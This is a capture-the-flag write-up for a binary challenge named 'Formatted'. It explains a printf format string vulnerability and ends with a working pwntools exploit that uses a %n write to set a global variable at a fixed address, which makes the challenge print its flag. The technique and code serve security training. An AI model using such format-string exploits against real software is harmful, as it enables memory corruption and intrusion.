# Formatted

| | |
|---|---|
| **Section** | Software Security |
| **Category** | binary |
| **Solves** | 420 |

## Overview

`checksec` shows Full RELRO, canary, NX, no PIE. In `main`, `fgets(buf, 0x20, stdin)` reads into a stack buffer which is then passed straight into `printf(buf)`, no `%s`, classic format string bug. Right after, the code checks a global `int flag` at the fixed address `0x40404c`, and if it's non-zero calls `printFlag()`, which just opens and prints `flag.txt`. So the goal isn't leaking anything, it's flipping that one global from 0 to non-zero via `%n`.

Bruteforcing `%N$p` with a known 8-byte marker at the start of the buffer shows that argument `%6$` maps to `buf[0:8]`, `%7$` to `buf[8:16]`, and so on. The input buffer sits on the stack and doubles as printf's own varargs, so we can use it to plant both the format string and the target address.

## Solve

Payload: `"AAAA%7$n"` in the first 8 bytes, followed by the address of `flag` (`0x40404c`) packed as the next 8 bytes. `%7$n` writes the number of characters printed so far into the pointer at argument 7, which is exactly the address we just placed there. 4 characters ("AAAA") get printed before the `%n`, so `flag` becomes `4`, non-zero, and `printFlag()` fires.

```python
from pwn import *

p = remote('formatted.challs.olicyber.it', 10305)
p.recvuntil(b'?')

payload = b'AAAA%7$n' + p64(0x40404c)
p.sendline(payload)

print(p.recvall(timeout=3).decode())
```
